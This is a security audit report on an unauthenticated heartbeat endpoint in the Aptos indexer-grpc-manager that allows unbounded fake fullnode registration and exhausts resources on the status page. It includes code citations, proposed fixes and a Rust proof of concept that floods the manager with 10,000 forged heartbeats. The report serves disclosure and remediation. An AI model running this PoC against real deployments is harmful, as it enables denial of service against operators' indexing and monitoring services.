# Audit Report

## Title
Unbounded Fullnode Registration Leading to Status Endpoint Resource Exhaustion

## Summary
The indexer-grpc-manager's status endpoint is vulnerable to resource exhaustion through unbounded fullnode registration via unauthenticated heartbeat requests. An attacker can register thousands of fake fullnodes, causing the status page rendering to consume excessive CPU and memory, blocking the health check endpoint.

## Finding Description

The vulnerability exists in the interaction between three components:

1. **Unauthenticated Heartbeat Endpoint**: The `GrpcManager::heartbeat()` RPC endpoint accepts any `HeartbeatRequest` without authentication or authorization. [1](#0-0) 

2. **Unbounded Fullnode Storage**: The `MetadataManager` stores fullnode information in a `DashMap<GrpcAddress, Fullnode>` with no size limits. Each fullnode maintains a `VecDeque<FullnodeInfo>` with up to 100 historical state entries. [2](#0-1) 

Critically, fullnodes are intentionally never removed from the system: [3](#0-2) 

3. **Expensive Status Page Rendering**: When the status endpoint is accessed, `get_fullnodes_info()` clones ALL fullnode VecDeques: [4](#0-3) 

Then `render_fullnode_tab()` synchronously processes every entry: [5](#0-4) 

The status endpoint is served on the health check port with no rate limiting: [6](#0-5) 

**Attack Path**:
1. Attacker sends thousands of `HeartbeatRequest` messages with unique `ServiceInfo.address` values containing `FullnodeInfo`
2. Each request calls `handle_fullnode_info()` which inserts/updates entries in the unbounded `fullnodes` DashMap [7](#0-6) 
3. Attacker (or any user) accesses the status page at the root path of the health check port
4. The system clones thousands of VecDeques (each with up to 100 `FullnodeInfo` entries)
5. Synchronous HTML table rendering consumes excessive CPU building thousands of table rows
6. The async runtime blocks, preventing other health check requests from being served

## Impact Explanation

This vulnerability qualifies as **Medium Severity** per Aptos bug bounty criteria for the following reasons:

**Affected Component**: The indexer-grpc-manager is an auxiliary data indexing service, not part of the core consensus layer. It does not run on validator nodes and does not affect blockchain consensus, transaction processing, or state commitment.

**Impact Scope**:
- **API Availability**: The health check endpoint becomes unresponsive, affecting monitoring systems
- **Resource Consumption**: Excessive memory (potentially hundreds of MB) and CPU usage during status page rendering
- **Service Degradation**: The blocking synchronous operation can delay other async tasks on the health check port

**Why Not Higher Severity**: 
- Does not affect validator operations or consensus
- The main gRPC service endpoints (GetTransactions, Heartbeat for legitimate services) run on a separate port
- No funds at risk, no state corruption, no consensus violations
- Recovery is possible by restarting the service

The vulnerability breaks the documented invariant: **"Resource Limits: All operations must respect gas, storage, and computational limits"** - the status endpoint rendering has no resource limits.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- **No Authentication Required**: The heartbeat endpoint is completely open
- **No Rate Limiting**: An attacker can send unlimited heartbeat requests
- **Low Complexity**: Simple gRPC client can send thousands of requests
- **Persistent Impact**: Registered fullnodes are never removed, making the attack permanent
- **Easy Trigger**: Any access to the status page (including automated monitoring) triggers the resource exhaustion

The only barrier is network connectivity to the indexer-grpc-manager service, which is typically exposed for legitimate fullnodes to connect.

## Recommendation

Implement multiple defense layers:

**1. Add Authentication/Authorization to Heartbeat Endpoint**:
```rust
// In service.rs, validate the service address against a whitelist
async fn heartbeat(&self, request: Request<HeartbeatRequest>) 
    -> Result<Response<HeartbeatResponse>, Status> {
    let request = request.into_inner();
    if let Some(service_info) = request.service_info {
        if let Some(address) = service_info.address {
            // Validate address against configured allowlist
            if !self.is_allowed_address(&address) {
                return Err(Status::permission_denied("Unauthorized service address"));
            }
            // ... rest of handling
        }
    }
}
```

**2. Add Size Limit to Fullnodes DashMap**: [7](#0-6) 

```rust
const MAX_FULLNODES: usize = 100; // Configurable limit

fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
    if !self.fullnodes.contains_key(&address) && self.fullnodes.len() >= MAX_FULLNODES {
        bail!("Maximum number of fullnodes ({}) reached", MAX_FULLNODES);
    }
    // ... existing logic
}
```

**3. Implement Pagination for Status Page**:
```rust
fn render_fullnode_tab(fullnodes_info: HashMap<String, VecDeque<FullnodeInfo>>, 
                       page: usize, page_size: usize) -> Tab {
    let entries: Vec<_> = fullnodes_info.into_iter()
        .skip(page * page_size)
        .take(page_size)
        .collect();
    // Render only page_size entries
}
```

**4. Remove Stale Fullnodes**: Modify the metadata manager loop to remove fullnodes that haven't sent heartbeats within a threshold (similar to how live/historical data services are removed).

## Proof of Concept

```rust
// PoC: Register thousands of fake fullnodes and trigger status page DoS
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient, 
    HeartbeatRequest, ServiceInfo, FullnodeInfo
};
use aptos_protos::util::timestamp::Timestamp;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let manager_address = "http://127.0.0.1:50051"; // Manager gRPC port
    
    // Step 1: Register 10,000 fake fullnodes
    println!("Registering 10,000 fake fullnodes...");
    for i in 0..10000 {
        let mut client = GrpcManagerClient::connect(manager_address).await?;
        let fake_address = format!("http://fake-fullnode-{}.example.com:8080", i);
        
        let now = SystemTime::now().duration_since(UNIX_EPOCH)?;
        let request = HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(fake_address),
                info: Some(aptos_protos::indexer::v1::service_info::Info::FullnodeInfo(
                    FullnodeInfo {
                        chain_id: 1,
                        timestamp: Some(Timestamp {
                            seconds: now.as_secs() as i64,
                            nanos: now.subsec_nanos() as i32,
                        }),
                        known_latest_version: Some(1000000 + i),
                    }
                )),
            }),
        };
        
        let _ = client.heartbeat(request).await;
        if i % 1000 == 0 {
            println!("Registered {} fullnodes", i);
        }
    }
    
    println!("\n10,000 fake fullnodes registered!");
    println!("Now access the status page at http://127.0.0.1:{health_port}/");
    println!("Expected: Long delay (10+ seconds) and high CPU/memory usage");
    println!("Monitor with: curl -w '\\nTime: %{time_total}s\\n' http://127.0.0.1:{health_port}/");
    
    Ok(())
}
```

**Expected Behavior**: Status page takes 10+ seconds to load and consumes several hundred MB of memory during rendering. Repeated access blocks the health check endpoint.

**Notes**
- This is an application-level resource exhaustion vulnerability, distinct from network-level DoS (which is out of scope)
- The vulnerability exists because legitimate operational requirements (fullnode registration, status monitoring) were implemented without proper resource limits or authentication
- While the indexer-grpc-manager is not part of core consensus, its unavailability affects operational monitoring and data availability for ecosystem applications

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L127-137)
```rust
pub(crate) struct MetadataManager {
    chain_id: u64,
    self_advertised_address: GrpcAddress,
    grpc_managers: DashMap<GrpcAddress, Peer>,
    fullnodes: DashMap<GrpcAddress, Fullnode>,
    live_data_services: DashMap<GrpcAddress, LiveDataService>,
    historical_data_services: DashMap<GrpcAddress, HistoricalDataService>,
    known_latest_version: AtomicU64,
    // NOTE: We assume the master is statically configured for now.
    master_address: Mutex<Option<GrpcAddress>>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L306-306)
```rust
            // NOTE: We don't remove FNs and GrpcManagers here intentionally.
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L376-381)
```rust
    pub(crate) fn get_fullnodes_info(&self) -> HashMap<String, VecDeque<FullnodeInfo>> {
        self.fullnodes
            .iter()
            .map(|entry| (entry.key().clone(), entry.value().recent_states.clone()))
            .collect()
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L43-97)
```rust
fn render_fullnode_tab(fullnodes_info: HashMap<String, VecDeque<FullnodeInfo>>) -> Tab {
    let overview = Container::new(ContainerType::Section)
        .with_paragraph_attr("Connected Fullnodes", [(
            "style",
            "font-size: 24px; font-weight: bold;",
        )])
        .with_table(
            fullnodes_info.into_iter().fold(
                Table::new()
                    .with_attributes([("style", "width: 100%; border: 5px solid black;")])
                    .with_thead_attributes([(
                        "style",
                        "background-color: lightcoral; color: white;",
                    )])
                    .with_custom_header_row(
                        TableRow::new()
                            .with_cell(TableCell::new(TableCellType::Header).with_raw("Id"))
                            .with_cell(
                                TableCell::new(TableCellType::Header)
                                    .with_raw("Last Ping/Heartbeat Time"),
                            )
                            .with_cell(
                                TableCell::new(TableCellType::Header)
                                    .with_raw("Known Latest Version"),
                            ),
                    ),
                |table, fullnode_info| {
                    let last_sample = fullnode_info.1.back();
                    let (timestamp, known_latest_version) = if let Some(last_sample) = last_sample {
                        (
                            format!("{:?}", last_sample.timestamp.unwrap()),
                            format!("{}", last_sample.known_latest_version()),
                        )
                    } else {
                        ("No data point.".to_string(), "No data point.".to_string())
                    };
                    table.with_custom_body_row(
                        TableRow::new()
                            .with_cell(
                                TableCell::new(TableCellType::Data).with_raw(fullnode_info.0),
                            )
                            .with_cell(TableCell::new(TableCellType::Data).with_raw(timestamp))
                            .with_cell(
                                TableCell::new(TableCellType::Data).with_raw(known_latest_version),
                            ),
                    )
                },
            ),
        );
    let content = HtmlElement::new(HtmlTag::Div)
        .with_container(overview)
        .into();

    Tab::new("Fullnodes", content)
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L219-222)
```rust
    let status_endpoint = warp::path::end().and_then(move || {
        let config = config.clone();
        async move { config.status_page().await }
    });
```
